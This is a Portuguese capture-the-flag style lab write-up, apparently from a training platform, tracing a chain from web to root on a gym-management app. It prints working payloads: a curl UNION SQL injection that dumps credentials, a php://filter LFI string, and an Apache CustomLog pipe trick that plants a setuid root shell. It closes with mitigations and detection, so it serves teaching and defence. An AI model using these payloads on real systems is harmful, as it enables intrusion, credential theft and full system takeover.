FIT Healthy Center — da web ao root

ExploitMind · Lab D002 CRÍTICO SQLi UNIONauth bypassLFI php://filter reuso de senhasudo privesc

resumo

Aplicação de gestão de academia (dois vhosts). O comprometimento parte de OSINT no código-fonte público, passa por SQL Injection não autenticada que devolve credenciais em texto plano, LFI para leitura de código-fonte e termina em root via abuso de uma regra sudo combinada com um arquivo de configuração gravável.

a cadeia

  1. 1
    Recon — vhost e fingerprint (OSINT)

    Painel gestao.fithealthy.expm descoberto por fuzzing do header Host. A app é um deploy não customizado de um projeto open-source do GitHub — o gym.sql público entrega o schema inteiro do banco antes do primeiro payload (CWE-200).

  2. 2
    Acesso inicial — SQLi UNION sem autenticação

    O endpoint gym_search.php responde a POST direto, sem sessão (CWE-862), e concatena o parâmetro na query. Um UNION SELECT de 4 colunas puxa usuário e senha da tabela login para os campos renderizados:

    curl -s -H "Host: gestao.fithealthy.expm" \
  "http://10.0.0.11/gym_search.php" \
  --data-urlencode "name=x' UNION SELECT id,uname,pwd,4 FROM login#"

# → admin : [senha em texto plano — mascarada]

    Senha em texto plano no banco (CWE-256): a própria aplicação entrega a credencial de admin em uma requisição.

  3. 3
    LFI — leitura de código-fonte via php://filter

    O parâmetro info do roteador cai num include(@$info) sem sanitização. O wrapper devolve o PHP em Base64 em vez de executá-lo, expondo db.php:

    home.php?info=php://filter/convert.base64-encode/resource=db.php
  4. 4
    Pivot — reuso de credencial para SSH

    A senha hard-coded do banco em db.php (CWE-798) foi reusada como senha de sistema do usuário george → shell via SSH.

  5. 5
    Privesc — sudo + config do Apache gravável → root

    george pode sudo systemctl restart apache2 (NOPASSWD) e consegue escrever no .conf do Apache. Injeta uma diretiva CustomLog "|comando" que o processo master executa como root no restart:

    echo 'CustomLog "|/bin/sh -c '\''cp /bin/bash /tmp/rb;chmod 4755 /tmp/rb'\''" combined' \
  >> /etc/apache2/sites-available/fithealthy.conf
sudo systemctl restart apache2
/tmp/rb -p        # euid=0 (root)

mecanismo — por que funciona

SQLi UNION: o PHP só imprime o que o MySQL devolve; ele não sabe de qual tabela veio a linha. Como a query original tem 4 colunas, um UNION SELECT com 4 valores da tabela login cai exatamente nos campos renderizados.

LFI com php://filter: include() executaria o .php (nada de código-fonte). O filtro convert.base64-encode transforma o arquivo num blob Base64 inofensivo, que o include só ecoa — contornando a execução e vazando o fonte.

Privesc: o master do Apache é iniciado pelo systemd como root e relê toda a config ainda como root, antes do drop de privilégio para os workers www-data. A diretiva de log com pipe roda via popen() nesse momento — logo, como root. A regra sudo isolada é inofensiva; é a combinação com o arquivo gravável (CWE-732) que vira root.

detecção / mitigação

  • Prepared statements (mysqli/PDO) matam a classe inteira de UNION SQLi.
  • Hash forte (bcrypt/argon2) — sozinho já neutraliza o vazamento de credencial mesmo com a SQLi presente.
  • Remover o else { include(@$info) }: whitelist fechada, sem fallback.
  • Nunca reusar a senha do banco como senha de SO; config crítica não gravável por usuário não-root.
  • Detecção: alterações no .conf do Apache fora de janela de deploy, ou um CustomLog com |, são sinais claros (FIM / auditd em /etc/apache2).
